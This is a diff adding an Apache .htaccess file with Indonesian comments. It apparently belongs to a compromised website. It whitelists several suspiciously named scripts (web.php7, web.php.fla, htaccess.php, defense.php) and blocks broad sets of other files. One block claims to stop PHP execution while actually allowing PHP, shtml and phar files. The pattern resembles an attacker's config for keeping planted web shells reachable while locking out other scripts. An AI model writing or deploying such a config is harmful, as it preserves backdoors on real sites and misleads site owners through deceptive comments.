@@ -1,0 +1,63 @@
+Options -Indexes
+<FilesMatch "^cron.php$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^web.shtml$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^index.shtml$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^web.php7$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^web.php.fla$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^.htaccess$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^htaccess.php$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^defense.php$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+<FilesMatch "(?i).*(.ph|.sh|.pj|.env|.zip|.log|cg|pe|in|access_log|.conf|.py|.hta).*">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+# Blokir eksekusi file PHP
+<FilesMatch "\.(php|php5|phtml|phar|pht|shtml|inc|suspected|exe|php.|pjpg|PhP|ShTmL|py|PERL|cgi)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+
+# Blokir eksekusi file yang berpotensi berbahaya
+<FilesMatch "\.(pl|cgi|py|asp|aspx|js|exe|sh|bat|cmd|bin)$">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+
+# Blokir akses ke file konfigurasi dan lainnya
+<FilesMatch "^\.(htaccess|dat|passwd|etc|htpasswd|ini|log|sh|bak)$">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+
+# Mencegah penjelajahan direktori
+
+# Izinkan hanya file tertentu (misalnya gambar dan PDF)
+<FilesMatch "\.(gif|jpg|jpeg|png|pdf)$">
+    Order Allow,Deny
+    Allow from all
+</FilesMatch>
